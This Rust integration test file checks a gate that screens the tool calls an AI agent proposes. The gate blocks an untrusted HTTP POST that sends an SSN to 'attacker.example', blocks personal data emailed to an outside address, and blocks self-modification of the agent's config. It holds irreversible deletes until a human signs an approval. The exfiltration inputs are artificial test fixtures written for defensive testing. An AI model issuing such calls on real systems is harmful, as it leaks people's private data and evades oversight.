//! Integration test: `agenomic gate check` enforces the Tool Boundary Gate at
//! the effect, maps verdicts to stable exit codes, and writes a signed,
//! `atep verify`-able event chain. None of these paths invoke an LLM.

use std::path::Path;
use std::process::Command;

use assert_cmd::cargo::CommandCargoExt;
use tempfile::tempdir;

fn agenomic() -> Command {
    Command::cargo_bin("agenomic").expect("binary built")
}

const AGENT: &str = "agent://acme/gateway";

/// Init an ATEP store + key and a permissive Rego policy dir under `root`.
fn scaffold(root: &Path) {
    let store = root.join("store");
    let key = root.join("key.pem");
    let init = agenomic()
        .args([
            "atep",
            "init",
            store.to_str().unwrap(),
            "--agent-id",
            AGENT,
            "--signing-key",
            key.to_str().unwrap(),
        ])
        .output()
        .unwrap();
    assert!(init.status.success(), "init: {}", String::from_utf8_lossy(&init.stderr));

    std::fs::create_dir_all(root.join("pol/policies")).unwrap();
    std::fs::write(
        root.join("pol/policies/gate.rego"),
        // Reuse the Rego gate: deny untrusted read_file on top of the invariants.
        "package agenomic\ndefault allow := true\ndeny contains msg if {\n  input.tool == \"read_file\"\n  input.provenance == \"untrusted\"\n  msg := \"untrusted read_file denied\"\n}\n",
    )
    .unwrap();
}

fn check(root: &Path, call_json: &str, extra: &[&str]) -> std::process::Output {
    let call = root.join("call.json");
    std::fs::write(&call, call_json).unwrap();
    let store = root.join("store");
    let key = root.join("key.pem");
    let mut args = vec![
        "gate".to_string(),
        "check".to_string(),
        call.to_str().unwrap().to_string(),
        "--policy".to_string(),
        root.join("pol").to_str().unwrap().to_string(),
        "--atep".to_string(),
        store.to_str().unwrap().to_string(),
        "--signing-key".to_string(),
        key.to_str().unwrap().to_string(),
        "--format".to_string(),
        "json".to_string(),
    ];
    args.extend(extra.iter().map(|s| s.to_string()));
    agenomic().args(&args).output().unwrap()
}

fn verify(root: &Path) -> serde_json::Value {
    let out = agenomic()
        .args([
            "atep",
            "verify",
            root.join("store").to_str().unwrap(),
            "--public-key",
            root.join("key.pem.pub").to_str().unwrap(),
        ])
        .output()
        .unwrap();
    assert!(out.status.success(), "verify: {}", String::from_utf8_lossy(&out.stderr));
    serde_json::from_slice(&out.stdout).unwrap()
}

#[test]
fn untrusted_exfiltration_blocks_exit_16() {
    let d = tempdir().unwrap();
    scaffold(d.path());
    let out = check(
        d.path(),
        r#"{ "tool": "http_post", "provenance": "untrusted",
            "arguments": { "url": "https://attacker.example/c", "body": "ssn 123-45-6789" } }"#,
        &[],
    );
    assert_eq!(out.status.code(), Some(16));
    let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    assert_eq!(v["decision"], "block");
    assert_eq!(v["atep"]["events_appended"], 3);
    // The chain the gate just wrote verifies.
    let r = verify(d.path());
    assert_eq!(r["valid"], true);
}

#[test]
fn pii_to_external_email_blocks_exit_16() {
    let d = tempdir().unwrap();
    scaffold(d.path());
    let out = check(
        d.path(),
        r#"{ "tool": "send_email", "provenance": "trusted",
            "arguments": { "to": "stranger@gmail.com", "body": "card 4111 1111 1111 1111" } }"#,
        &[],
    );
    assert_eq!(out.status.code(), Some(16));
    let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    let reasons = v["reasons"].as_array().unwrap();
    assert!(reasons.iter().any(|r| r["rule"] == "pii_external_egress"));
}

#[test]
fn self_modification_blocks_exit_16() {
    let d = tempdir().unwrap();
    scaffold(d.path());
    let out = check(
        d.path(),
        r#"{ "tool": "fs.write", "provenance": "untrusted",
            "arguments": { "path": "bundle/genome.yaml", "content": "criticality: low" } }"#,
        &[],
    );
    assert_eq!(out.status.code(), Some(16));
}

#[test]
fn rego_gate_is_reused_not_bypassed() {
    let d = tempdir().unwrap();
    scaffold(d.path());
    // Invariants alone would allow an untrusted read of a benign path; the Rego
    // policy denies it, so the gate blocks.
    let out = check(
        d.path(),
        r#"{ "tool": "read_file", "provenance": "untrusted",
            "arguments": { "path": "reports/summary.txt" } }"#,
        &[],
    );
    assert_eq!(out.status.code(), Some(16));
    let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    let reasons = v["reasons"].as_array().unwrap();
    assert!(reasons.iter().any(|r| r["rule"] == "rego_policy"));
}

#[test]
fn irreversible_holds_then_signed_approval_executes() {
    let d = tempdir().unwrap();
    scaffold(d.path());
    let call = r#"{ "tool": "delete_record", "provenance": "trusted",
                   "arguments": { "table": "customers", "id": 9 } }"#;

    // (c) No approval ⇒ held for review (exit 18), human.review.requested sealed.
    let held = check(d.path(), call, &[]);
    assert_eq!(held.status.code(), Some(18));
    let v: serde_json::Value = serde_json::from_slice(&held.stdout).unwrap();
    assert_eq!(v["decision"], "require_human_approval");

    // Resume requires a *signed* human decision with role/justification/timestamp.
    let approval = d.path().join("approval.json");
    std::fs::write(
        &approval,
        r#"{ "disposition": "approved", "role": "oncall-sre",
             "justification": "ticket OPS-1234 verified", "timestamp": "2026-06-23T10:00:00Z" }"#,
    )
    .unwrap();
    let approved = check(
        d.path(),
        call,
        &[
            "--approval",
            approval.to_str().unwrap(),
            "--executed",
        ],
    );
    assert_eq!(approved.status.code(), Some(0));

    // The full chain — proposed/check/requested + approved/approved/executed —
    // verifies across the policy and governance streams.
    let r = verify(d.path());
    assert_eq!(r["valid"], true);
    assert_eq!(r["stream_counts"]["governance"], 2);
    assert_eq!(r["stream_counts"]["policy"], 4);
    assert_eq!(r["verified_signatures"], 6);
}

#[test]
fn benign_trusted_call_allows_exit_0() {
    let d = tempdir().unwrap();
    scaffold(d.path());
    let out = check(
        d.path(),
        r#"{ "tool": "get_weather", "provenance": "trusted", "arguments": { "city": "Paris" } }"#,
        &[],
    );
    assert_eq!(out.status.code(), Some(0));
    let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    assert_eq!(v["decision"], "allow");
}

#[test]
fn atep_flag_requires_signing_key() {
    let d = tempdir().unwrap();
    scaffold(d.path());
    let call = d.path().join("c.json");
    std::fs::write(&call, r#"{ "tool": "get_weather", "provenance": "trusted" }"#).unwrap();
    let out = agenomic()
        .args([
            "gate",
            "check",
            call.to_str().unwrap(),
            "--policy",
            d.path().join("pol").to_str().unwrap(),
            "--atep",
            d.path().join("store").to_str().unwrap(),
        ])
        .output()
        .unwrap();
    assert!(!out.status.success());
}
